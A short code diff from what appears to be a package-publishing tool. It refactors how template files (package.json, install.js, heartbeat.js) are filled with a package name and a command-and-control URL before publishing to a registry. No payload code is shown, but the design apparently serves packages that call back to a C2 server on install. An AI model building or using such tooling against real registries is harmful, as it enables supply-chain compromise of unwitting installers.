@@ -8,6 +8,10 @@ import crypto from 'crypto';
 const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
 const TEMPLATE_FILES = ['package.json', 'install.js', 'heartbeat.js'];
 
+export function renderTemplate(content: string, pkgName: string, c2Url: string): string {
+  return content.replaceAll('__PKG_NAME__', pkgName).replaceAll('__C2_URL__', c2Url);
+}
+
 export function publishPackage(pkgName: string): { success: boolean; output: string } {
   const c2Url = process.env.C2_URL || 'http://localhost:3000';
   const registryUrl = process.env.REGISTRY_URL;
@@ -19,7 +23,7 @@ export function publishPackage(pkgName: string): { success: boolean; output: str
   try {
     for (const file of TEMPLATE_FILES) {
       let content = fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
-      content = content.replaceAll('__PKG_NAME__', pkgName).replaceAll('__C2_URL__', c2Url);
+      content = renderTemplate(content, pkgName, c2Url);
       fs.writeFileSync(path.join(tmpDir, file), content);
     }
 
